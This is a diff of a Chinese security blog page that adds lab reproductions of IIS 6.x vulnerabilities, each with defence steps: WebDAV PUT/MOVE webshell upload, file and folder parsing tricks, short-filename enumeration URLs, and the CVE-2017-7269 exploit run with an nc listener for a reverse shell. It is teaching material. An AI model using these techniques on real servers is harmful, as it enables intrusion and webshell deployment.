@@ -255,8 +255,151 @@
         </header>
 
         <div class="post-content">
-            <h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h2><h3 id="put漏洞"><a href="#put漏洞" class="headerlink" title="put漏洞"></a>put漏洞</h3><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传</p>
-<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h3 id="短文件漏洞"><a href="#短文件漏洞" class="headerlink" title="短文件漏洞"></a>短文件漏洞</h3><h2 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h2><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><h3 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行(MS15-034)"></a>HTTP.SYS远程代码执行(MS15-034)</h3><h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><h1 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h1>
+            <h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h2><h3 id="put漏洞"><a href="#put漏洞" class="headerlink" title="put漏洞"></a>put漏洞</h3><p>目标网站upload.moonteam.com搭建在IIS上，并且IIS Server 在 Web 服务扩展中开启了 WebDAV</p>
+<img src="/2022/05/10/22-0510-01/image-20220513161754619.png" alt="image-20220513161754619" style="zoom:80%;">
+
+<p> 同时目标网站upload.moonteam.com配置了可以写入的权限</p>
+<img src="/2022/05/10/22-0510-01/image-20220513162427686.png" alt="image-20220513162427686" style="zoom:80%;">
+
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>对目标网站进行burp抓包，然后将GET改成OPTIONS，查看支持的协议</p>
+<img src="/2022/05/10/22-0510-01/image-20220513163501850.png" alt="image-20220513163501850" style="zoom:80%;">
+
+<p>改成OPTIONS后，发现支持PUT上传方式，当然也支持MOVE（重命名）</p>
+<img src="/2022/05/10/22-0510-01/image-20220513163707880.png" alt="image-20220513163707880" style="zoom:80%;">
+
+<p>然后通过put上传一个文本文档到目标网站中</p>
+<img src="/2022/05/10/22-0510-01/image-20220513164032816.png" alt="image-20220513164032816" style="zoom:80%;">
+
+<p>成功上传到目标网站中</p>
+<img src="/2022/05/10/22-0510-01/image-20220513164233469.png" alt="image-20220513164233469" style="zoom:80%;">
+
+<p>然后通过MOVE重命名把ayu.txt改成ayu.asp</p>
+<img src="/2022/05/10/22-0510-01/image-20220513164824878.png" alt="image-20220513164824878" style="zoom:80%;">
+
+
+
+<p>修改成功</p>
+<img src="/2022/05/10/22-0510-01/image-20220513165825800.png" alt="image-20220513165825800" style="zoom:80%;">
+
+<p>后续的操作就无需多言了，但这里为啥我们不直接通过PUT上传ayu.asp呢？因为一般直接上传都是失败的，所以先上传txt文件，然后再通过MOVE修改成asp文件</p>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol>
+<li>关闭webdav</li>
+<li>关闭写入权限</li>
+</ol>
+<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="基于文件名"><a href="#基于文件名" class="headerlink" title="基于文件名"></a>基于文件名</h4><p>该版本的IIS会默认将<code>*.asp;.jpg</code> 此种格式的文件名，当成Asp解析。服务器默认不解析 <code>;</code> 号及其后面的内容，相当于截断</p>
+<p>由于在目标网站的属性—主目录—配置—映射—应用程序扩展—编辑，查看到<code>.asa</code>被映射到了可执行文件<code>C:\WINDOWS\system32\inetsrv\asp.dll</code>，也就是说<code>.asa</code>可以被解析成<code>.asp</code></p>
+<img src="/2022/05/10/22-0510-01/image-20220513170825522.png" alt="image-20220513170825522" style="zoom:80%;">
+
+<p>基于上述配置，除了.asa会被解析成.asp外，cer、cdx都会被解析成asp，也就是说<code>cer</code>、<code>cdx</code>、<code>asa</code>扩展名都会被解析成<code>asp</code></p>
+<h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>我们的目标网站中已经提前上传了一个图片<code>sb.asp;1.jpg</code></p>
+<img src="/2022/05/10/22-0510-01/image-20220513172555287.png" alt="image-20220513172555287" style="zoom:80%;">
+
+<p>由于漏洞，所以<code>sb.asp;1.jpg</code>会被解析成<code>sb.asp</code>，而sb.asp是一个木马，我们访问该图片实际就是访问sb.asp木马，如下：</p>
+<img src="/2022/05/10/22-0510-01/image-20220513172912087.png" alt="image-20220513172912087" style="zoom:80%;">
+
+<h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><ol>
+<li>禁止创建和上传此类畸形文件</li>
+<li>图片存放目录设置成禁止脚本文件执行</li>
+<li>升级iis版本</li>
+</ol>
+<h4 id="基于文件夹"><a href="#基于文件夹" class="headerlink" title="基于文件夹"></a>基于文件夹</h4><p>该版本默认将 <code>*.asp/</code> 目录下的所有文件当成Asp解析</p>
+<h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p>目标网站下的c.asp文件夹下有一个asp的图片马1.jpg</p>
+<img src="/2022/05/10/22-0510-01/image-20220513173410570.png" alt="image-20220513173410570" style="zoom:80%;">
+
+<p>访问c.sap文件夹下的1.jpg，实际上会将1.jpg解析成1.asp木马，如下：</p>
+<img src="/2022/05/10/22-0510-01/image-20220513173530870.png" alt="image-20220513173530870" style="zoom:80%;">
+
+<h5 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h5><ol>
+<li>禁止创建此类文件夹</li>
+<li>升级iis版本</li>
+</ol>
+<h3 id="短文件漏洞"><a href="#短文件漏洞" class="headerlink" title="短文件漏洞"></a>短文件漏洞</h3><p>Windows 支持以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位Windows的程序访问这些文件、</p>
+<p><strong>短文件名产生的条件</strong></p>
+<ul>
+<li>注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>中 <code>NtfsDisable8dot3NameCreation</code>的值为0</li>
+<li>当文件后缀名字符长度小于4时，短文件名的产生需要文件名前缀字符长度大于9位</li>
+<li>当文件后缀名字符长度大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名</li>
+</ul>
+<p><strong>短文件名的特征</strong></p>
+<ul>
+<li><p>只显示前6位的字符,后续字符用~1代替，其中数字1是可以递增。如果存在文件名类似的文件，则前面的6个字符是相同的,后面的数字进行递增</p>
+<img src="/2022/05/10/22-0510-01/image-20220513220308797.png" alt="image-20220513220308797" style="zoom:80%;">
+</li>
+<li><p>后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断</p>
+<img src="/2022/05/10/22-0510-01/image-20220513220530626.png" alt="image-20220513220530626" style="zoom:80%;">
+</li>
+<li><p>所有小写字母均转换成大写的字母</p>
+<img src="/2022/05/10/22-0510-01/image-20220513220638045.png" alt="image-20220513220638045" style="zoom:80%;">
+</li>
+<li><p>长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀</p>
+<img src="/2022/05/10/22-0510-01/image-20220513220822135.png" alt="image-20220513220822135" style="zoom:80%;">
+</li>
+<li><p>长文件名前缀&#x2F;文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符,不论长度均会生成短文件</p>
+<img src="/2022/05/10/22-0510-01/image-20220513221236003.png" alt="image-20220513221236003" style="zoom:80%;"></li>
+</ul>
+<p>如下，可以通过 <code>dir /x</code> 查看短文件名（同时参考上面短文件名产生的条件）</p>
+<img src="/2022/05/10/22-0510-01/image-20220513215739094.png" alt="image-20220513215739094" style="zoom:80%;">
+
+<h4 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h4><p>IIS 8.0 以下版本需要开启 ASP.NET 支持（如果IIS &gt;&#x3D;8.0 版本,即使没有安装 ASP.NET ，通过 OPTIONS 和 TRACE 方法也可以猜解成功）</p>
+<p>由于这里是IIS 6.x ，所以首先开启ASP.NET支持，开启方法如下：</p>
+<img src="/2022/05/10/22-0510-01/image-20220513175118578.png" alt="image-20220513175118578" style="zoom:80%;">
+
+<p>查看当前网站目录下的短文件名</p>
+<img src="/2022/05/10/22-0510-01/image-20220513225756156.png" alt="image-20220513225756156" style="zoom:80%;">
+
+<p><strong>验证存在短文件名漏洞</strong></p>
+<p>只要有短文件名，那么基本都会有<code>~1</code>，通过正则表达式通配符<code>*</code>可以匹配到其它的字符，比如：<code>1234~1.JPE</code>，第一个<code>*</code>匹配<code>1234</code>，第二个<code>*</code>匹配<code>.JPE</code>，这样<code>*~1*</code>，就能匹配到<code>1234~1.JPE</code>。</p>
+<p>所以只要短文件名，基本都有<code>~1</code>，而通过<code>*~1*</code>则能够匹配到短文件名</p>
+<p>访问<code>http://upload.moonteam.com/*~1*/a.aspx</code>出现404，说明目标网站中存在短文件名（a.aspx没看懂有啥用，但貌似必须要有）</p>
+<img src="/2022/05/10/22-0510-01/image-20220513223500472.png" alt="image-20220513223500472" style="zoom:80%;">
+
+<p>通过浏览器访问短文件名<code>bbbbb*~1*</code>，返回400，说明<code>bbbbb*~1*</code>无法匹配到短文件名，也就是没有相关的短文件名</p>
+<p>访问<code>http://upload.moonteam.com/bbbbb*~1*/a.aspx</code></p>
+<img src="/2022/05/10/22-0510-01/image-20220513224950889.png" alt="image-20220513224950889" style="zoom:80%;">
+
+<p>通过访问上面两个payload，根据返回的404和400状态码，可判断出目标网站存在短文件漏洞</p>
+<p><strong>猜解短文件名</strong></p>
+<p>访问<code>http://upload.moonteam.com/1*~1*/a.aspx</code>，出现404，说明<code>1*~1*</code>可以匹配到目标网站的短文件名</p>
+<img src="/2022/05/10/22-0510-01/image-20220513225316106.png" alt="image-20220513225316106" style="zoom:80%;">
+
+<p>访问<code>http://upload.moonteam.com/12*~1*/a.aspx</code>，出现404，说明<code>12*~1*</code>也可以匹配到目标网站的短文件名</p>
+<img src="/2022/05/10/22-0510-01/image-20220513225439612.png" alt="image-20220513225439612" style="zoom:80%;">
+
+<p>访问<code>http://upload.moonteam.com/123*~1*/a.aspx</code>，出现404，说明<code>123*~1*</code>也可以匹配到目标网站的短文件名</p>
+<img src="/2022/05/10/22-0510-01/image-20220513225506172.png" alt="image-20220513225506172" style="zoom:80%;">
+
+<p>访问<code>http://upload.moonteam.com/1234*~1*/a.aspx</code>，出现404，说明<code>1234*~1*</code>也可以匹配到目标网站的短文件名</p>
+<img src="/2022/05/10/22-0510-01/image-20220513225537245.png" alt="image-20220513225537245" style="zoom:80%;">
+
+<p>访问<code>http://upload.moonteam.com/12345*~1*/a.aspx</code>，出现400，说明<code>12345*~1*</code>匹配不到到目标网站的短文件名，也就是说目标的短文件名的前缀为1234</p>
+<img src="/2022/05/10/22-0510-01/image-20220513225834496.png" alt="image-20220513225834496" style="zoom:80%;">
+
+<p>访问<code>http://upload.moonteam.com/1234*~1.jpe*/a.aspx</code>出现404，说明短文件名就是<code>1234.jpe</code>，但是一般没有jpe这样格式的文件，而结合短文件名的特点，猜解出1234.jpe这个短文件名对应的文件可能是1234.jpeg</p>
+<img src="/2022/05/10/22-0510-01/image-20220513230150625.png" alt="image-20220513230150625" style="zoom:80%;">
+
+<p><strong>利用脚本猜接短文件名</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/shelldownow/python3-iis_shortname_Scan-">https://github.com/shelldownow/python3-iis_shortname_Scan-</a></p>
+<p><strong>短文件名漏洞的局限性</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解</span><br><span class="line">如果文件名本身太短（无短文件名）也是无法猜解的</span><br><span class="line">如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配</span><br><span class="line">如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报</span><br><span class="line">不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测</span><br></pre></td></tr></table></figure>
+
+<h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><ol>
+<li><p>升级.net framework</p>
+</li>
+<li><p>修改注册表键值<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>修改<code>NtfsDisable8dot3NameCreation</code>为1，修改完成后,需要重启系统生效。也可通过命令行 <code>fsutil behavior set disable8dot3 1</code>关闭短文件名）</p>
+<p>注意：注:此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除,需要重新复制才会消失。如果不重新复制，已经存在的短文件名则是不会消失的。</p>
+</li>
+</ol>
+<h3 id="IIS-RCE-CVE-2017-7269"><a href="#IIS-RCE-CVE-2017-7269" class="headerlink" title="IIS RCE-CVE-2017-7269"></a>IIS RCE-CVE-2017-7269</h3><p>Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 If:&lt;http:&#x2F;&#x2F; 开头的长标头执行任意代码 PROPFIND请求</p>
+<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p>
+<h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p>exp地址：<a target="_blank" rel="noopener" href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python iis 192.168.0.115 80 192.168.0.154 9999 </span><br><span class="line">nc -lvnp 9999</span><br><span class="line">//192.168.0.115是目标网站ip，80是目标网站对应的端口，192.168.0.154是攻击主机的ip</span><br><span class="line">//nc -lvnp 9999在攻击主机上做监听</span><br></pre></td></tr></table></figure>
+
+<h4 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4><ol>
+<li>关闭 WebDav服务</li>
+<li>升级</li>
+<li>部署安全设备</li>
+</ol>
+<h2 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h2><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><h3 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行(MS15-034)"></a>HTTP.SYS远程代码执行(MS15-034)</h3><h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><h1 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h1>
         </div>		
 		
         <section class="post-tags">
@@ -370,3 +513,9 @@
     </div>
 </body>
 </html>
+
+
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
